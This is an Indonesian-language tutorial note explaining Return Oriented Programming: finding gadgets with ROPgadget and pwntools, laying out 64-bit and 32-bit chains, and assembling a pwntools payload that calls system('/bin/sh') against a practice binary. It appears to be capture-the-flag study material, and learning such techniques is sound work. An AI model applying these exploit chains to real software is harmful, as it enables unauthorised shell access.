#cybersecurity

ROP (Return Oriented Programming) adalah teknik exploit yang memakai instruksi kecil yang sudah ada di binary/libc - disebut **gadget** - yang diakhiri `ret`. Dengan merangkai alamat gadget di stack, kita membuat CPU menjalankan "program baru" tanpa menulis kode apa pun.

## Kenapa ROP?

- **NX on** → tidak bisa eksekusi shellcode di stack
- Solusi: pakai instruksi yang **sudah executable** (di `.text`, libc)

## Gadget

Gadget = urutan instruksi singkat yang diakhiri `ret`, contoh:

```asm
pop rdi ; ret        ; ambil 8 byte dari stack ke RDI, lalu ret
pop rsi ; ret
pop rdx ; ret
ret                  ; ret saja
```

Cari gadget:

```bash
ROPgadget --binary chall | grep "pop rdi"
# 0x00000000004013b3 : pop rdi ; ret
```

Atau dari pwntools:

```python
from pwn import *
rop = ROP(elf)
print(rop.find_gadget(["pop rdi", "ret"]))
```

## Cara kerja rantai ROP

Kita menaruh **deretan alamat gadget** di stack. Setiap `ret` memindahkan eksekusi ke gadget berikutnya:

```
Stack (payload):
[pop rdi; ret]        <- ret dari vuln() lompat ke sini
[0xdeadbeef]          <- di-pop ke RDI
[addr system]         <- ret dari gadget lompat ke system
["/bin/sh"]           <- argumen ke-2 system? TIDAK! 64-bit...
```

### 64-bit (argumen lewat register)

Untuk memanggil `system("/bin/sh")` di 64-bit:

```
[pop rdi; ret] [addr "/bin/sh"] [addr system]
```

- `pop rdi; ret` mengambil `/bin/sh` dari stack → RDI
- `ret` → lompat ke `system`, yang membaca RDI = "/bin/sh"

### 32-bit (argumen di stack)

```
[addr system] [return addr] [addr "/bin/sh"]
```

Argumen langsung mengikuti alamat fungsi - tidak butuh gadget.

## Contoh payload ROP 64-bit

```python
from pwn import *

elf = context.binary = ELF("./chall")
pop_rdi = 0x4013b3
binsh = 0x402004        # alamat string "/bin/sh" (di binary, kalau ada)
system = 0x401050       # system@plt

payload = b"A"*offset
payload += p64(pop_rdi) + p64(binsh) + p64(system)
```

## Membuat ROP dengan pwntools (otomatis)

```python
rop = ROP(elf)
rop.system(next(elf.search(b"/bin/sh")))
payload = b"A"*offset + rop.chain()
```

pwntools otomatis mencari gadget `pop rdi; ret` dan menyusun chain.

## Istilah

| Istilah | Arti |
|---|---|
| Gadget | Instruksi + `ret` |
| Chain | Rangkaian gadget |
| Ret2libc | ROP ke fungsi libc (system, execve) |
| One gadget | Satu alamat langsung dapat shell |

## Catatan

- ROP tidak terbatas di stack - bisa juga lewat `ret2csu` (gadget di `__libc_csu_init`) kalau gadget sederhana tidak ada.
- `ROPgadget --binary chall` dan `ropper` adalah teman terbaik.
- Materi lanjut: [[Ret2libc]], [[ROP 64-bit (pop rdi)]], dan di advanced: SROP, ret2dlresolve.
